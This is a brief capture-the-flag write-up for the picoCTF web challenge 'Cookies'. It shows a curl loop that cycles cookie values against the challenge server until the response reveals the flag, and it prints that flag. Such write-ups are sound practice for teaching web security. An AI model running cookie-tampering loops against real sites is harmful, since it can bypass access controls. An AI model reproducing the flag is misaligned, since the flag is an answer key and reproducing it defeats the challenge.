# Cookies

## Descripción
Who doesn't love cookies? Try to figure out the best one.

http://wily-courier.picoctf.net:55261/

## Solución


```
VictorCervantes-academy@webshell:~$ for i in {0..20}; do curl -s http://wily-courier.picoctf.net:55261/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
VictorCervantes-academy@webshell:~$ 
```

FLAG:
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## Notas adicionales
- Usando la terminal, filtrando las diferentes cookies hasta que la cookie correcta nos da la flag

## Referencias
- 